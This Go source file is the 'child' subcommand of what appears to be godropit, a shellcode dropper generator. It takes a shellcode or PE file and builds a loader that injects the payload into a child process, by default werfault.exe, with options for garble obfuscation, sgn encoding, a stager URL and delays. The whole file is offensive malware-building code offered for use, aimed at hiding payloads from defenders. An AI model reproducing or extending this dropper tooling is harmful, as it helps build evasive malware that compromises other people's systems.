package cmd

import (
	"log"

	"github.com/kopp0ut/godropit/internal/godroplib/child"
	"github.com/kopp0ut/godropit/pkg/gengo"

	"github.com/spf13/cobra"
)

var procArgs string
var proc string

// localCmd represents the local command
var childCmd = &cobra.Command{
	Use:   "child",
	Short: "Execute in a child process",
	Long:  `Executes in a child process which has been started by the same application.`,
	Run: func(cmd *cobra.Command, args []string) {
		checkImg()
		if input == "" {
			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
		}

		name = check(name)
		gengo.Garble = garble
		var childDrop gengo.Dropper
		var Dtype gengo.DtypeChild
		var err error

		Dtype.Args = procArgs
		Dtype.ChildProc = proc
		childDrop.Delay = time
		childDrop.Arch = arch
		childDrop.Shared = shared
		childDrop.Debug = debug

		childDrop.Dtype, err = gengo.GenDTypeChild(Dtype)
		if err != nil {
			log.Fatalln(err)
		}

		childDrop.Dlls, childDrop.Inject, childDrop.Import = child.SelectChild()

		gengo.NewDropper(childDrop, name, domain, input, output, stagerurl, imgpath, hostname, ua, sgn)

	},
}

func init() {
	newCmd.AddCommand(childCmd)

	childCmd.MarkFlagRequired("in")
	childCmd.MarkFlagRequired("name")
	childCmd.MarkFlagRequired("out")

	//child specific flags
	childCmd.Flags().StringVarP(&proc, "proc", "p", "c:\\\\windows\\\\system32\\\\werfault.exe", "Child Process to execute in.")
	childCmd.Flags().StringVar(&procArgs, "args", "", "Arguments to pass child proc, embed in quotes or escape spaces pls.")
}
